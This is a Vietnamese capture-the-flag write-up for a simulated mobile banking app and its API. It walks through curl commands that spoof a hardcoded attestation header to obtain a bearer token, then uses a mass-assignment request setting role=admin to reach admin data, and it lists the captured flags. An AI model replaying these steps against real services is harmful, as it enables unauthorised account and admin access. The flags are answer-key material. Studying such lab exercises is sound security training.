# Meridian Pay - Mobile (Hard)

**Flag:** Thu thập được ba trong tổng số bốn cờ (objective)
**File cung cấp:** `meridian-pay-3.2.1.apk.zip`, 12771 B (chứa file APK 16885 B, mã băm sha256 `447c3cd07770cfd78c6601f9076167208e5b670f3708be085cb69d08f741efa1`)
**Dịch vụ:** `https://web-3f25599ac74e8a91.web.h7tex.com`

```text
Cờ v1: H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
Cờ v2: H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
Cờ v4: H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
Cờ v3: Chưa giải cứu được
```

## Đề bài

Hệ thống mô phỏng một ứng dụng ngân hàng số (neobank) với phương pháp phát triển thiếu an toàn: Triển khai thiếu kiểm soát và thiếu cơ chế xác thực. Ứng dụng không kiểm tra phản hồi từ máy chủ, và máy chủ không xác thực thiết bị kết nối. 
Có 4 lỗ hổng riêng biệt tồn tại trong ứng dụng và tầng API, mỗi lỗ hổng chứa một cờ. Hệ thống cung cấp một file APK kích thước nhỏ (12.5 KB) và địa chỉ HTTP. Các mục tiêu này độc lập, không yêu cầu giải quyết theo trình tự.

## Phân tích ban đầu

Kích thước của file APK nhỏ bất thường. Kiểm tra cấu trúc, chỉ gồm các tệp cơ bản: `AndroidManifest.xml`, file dex `classes.dex` dung lượng 13.776 B, file tài nguyên `resources.arsc` 1100 B, một layout và thư mục chữ ký `META-INF/`. Không có các thư viện nhúng (lib) hay tài nguyên media (asset). Dấu vết biên dịch cho thấy ứng dụng được tạo từ trình D8 ở chế độ gỡ lỗi (`compilation-mode=debug`) với mục tiêu `min-api=24`.

Sử dụng lệnh `strings` để quét chuỗi trên cuộn mã dex, thu thập được các thông tin: `/api/v1/auth/device`, `/api/v1/promo/public`, `/files/`, `device_id`, `seedReceipts`, `val$ftoken`, `Authenticating device...`. 
Tuy nhiên, điểm đáng chú ý nhất là KHÔNG HIỆN DIỆN bất kỳ định dạng `H7CTF{` nào trong tệp. Kết luận: Các cờ đều lưu trên máy chủ (server), file APK đóng vai trò là tài liệu tham khảo cho các endpoint API.

Phân tích mã nguồn bằng `androguard`, phát hiện 3 lỗi xác thực như tác giả mô tả:

- Lớp `ApiClient` lưu cứng (hardcode) header: `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`. Lỗi thiết kế là máy chủ sử dụng chuỗi này làm chứng nhận thiết bị hợp lệ. Dữ liệu này không bị kiểm tra thực tế, client chỉ cần truyền "attested" là vượt qua xác thực.
- Phương thức `Session.setBaseUrl(...)` sử dụng trực tiếp chuỗi ký tự nhập trên giao diện. Hàm `RouterActivity` nhận deep link `?url=` và ghi đè url này vào SharedPreferences mà không xác thực.
- Provider `ExportProvider` mở quyền truy cập (exported). Đường dẫn lưu chuyển trong hàm `new File(receiptsDir, path.substring(7))` thiếu bảo mật, không chặn lỗi truy cập trái phép thư mục `..` (Directory Traversal). Thêm vào đó, `seedReceipts` có thể ghi dữ liệu xuống vùng `files/`.

Chiến thuật: Mô phỏng gọi API tương tự ứng dụng, khai thác hai lỗ hổng thiếu bảo mật của máy chủ: thứ nhất, việc tin tưởng header tự khai báo; thứ hai, việc xử lý toàn bộ thân (body) của request `PATCH /api/v1/profile` mà không có bộ lọc (Mass Assignment).

## Quá trình khai thác

**Bước 1 - Chiếm quyền truy cập Bearer bằng header giả mạo.** 
Gửi lệnh `POST /api/v1/auth/device` theo cách thông thường, máy chủ từ chối vì thiếu header xác thực:

```bash
curl -sk -X POST $U/api/v1/auth/device -H 'Content-Type: application/json' \
     -d '{"device_id":"probe-1"}'
```

```json
{"error":"client attestation required"}
```

Giải pháp: Chèn header mà ứng dụng đang dùng vào request, trường `device_id` có thể nhập tùy ý và hệ thống vẫn chấp nhận:

```bash
curl -sk -X POST $U/api/v1/auth/device \
     -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
     -H 'Content-Type: application/json' -d '{"device_id":"probe-1"}'
```

Máy chủ trả về mã 200 kèm `token`. Phân tích payload JWT HS256 thu được `{"sub":"1001",...}`. Hệ thống tự động cấp quyền (bearer token) của người dùng 1001 khi header giả mạo được cung cấp.

**Bước 2 - Trích xuất cờ v1.** 
Endpoint `promo/public` cung cấp endpoint quản lý nội bộ:

```html
<p>Enrolled members can finish loyalty sign-up in the app: <a href="/api/v1/internal/promo">complete enrollment</a>.</p>
```

Truy cập trực tiếp vào `/api/v1/internal/promo`, kèm header ngụy trang và token thu được:

```text
200  180  <html><body><h3>Meridian Pay - Loyalty Enrollment</h3><p>Welcome back, member 1001. Enrollment confirmation:</p><pre>H7CTF{474de245-b63a-4fc
```

**Bước 3 - Nâng quyền admin đoạt cờ v2 qua lỗ hổng Mass Assignment.** 
Cổng `PATCH /api/v1/profile` lưu trực tiếp toàn bộ dữ liệu từ body, bao gồm trường phân quyền `role` (hệ thống cho phép cập nhật `email`/`name`/`role`/`tier`). Tận dụng lỗi, truyền payload `role=admin` và truy cập dữ liệu quản trị (ledger):

```python
req("/api/v1/profile", "PATCH", {"role": "admin"}, hdr=A)
print(req("/api/v1/admin/ledger", hdr=A))
```

```text
200  152  {"corporate_master_key_rotation":"H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}","generated":"2026-09-24","note":"admin-only consolidated ledg
```

Ghi chú: Nếu truy cập đường dẫn trên mà không cập nhật `role`, máy chủ sẽ trả về lỗi: `{"error":"admin role required"}`.

**Bước 4 - Trích xuất cờ v4.** 
Sử dụng bearer token để truy cập `/api/v1/accounts/me`:

```text
1) accounts/me: 200 {"account":{"balance_cents":418233,"memo":"personal checking","number":"MP-0041-8827",
"owner":1001,"type":"checking"},"onboarding_memo":"session verified from device -
H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}","user_id":1001}
```

Trường `onboarding_memo` trả về cờ do máy chủ mặc định xác nhận header từ app là đảm bảo cho việc phiên (session) đã được xác minh trên thiết bị. 
Ở phía client, chuỗi mã JWT được lưu trong SharedPreferences dưới dạng plaintext, và `ExportProvider` cho phép trích xuất do không lọc path `..`.

**Bước 5 - Rà soát đối chiếu.** 
Thực hiện quá trình rà soát: Lấy token mới và truy vấn 3 endpoint API. Kết quả trả về 3 cờ đồng nhất. Quá trình thay đổi giá trị `tier` trong profile không hiển thị thêm cờ ẩn nào.

## Flag
```bash
python exploit.py https://web-3f25599ac74e8a91.web.h7tex.com
```

Kết quả:
```text
v1 /api/v1/internal/promo   H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
v2 /api/v1/admin/ledger     H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
v4 /api/v1/accounts/me      H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
v3 - Vẫn không có kết quả
```

Quá trình kiểm tra trên instance kết thúc khi phiên hết hạn. Nhiệm vụ cờ v3 đang được lưu lại hướng xử lý tiềm năng trong tệp `notes.md`.
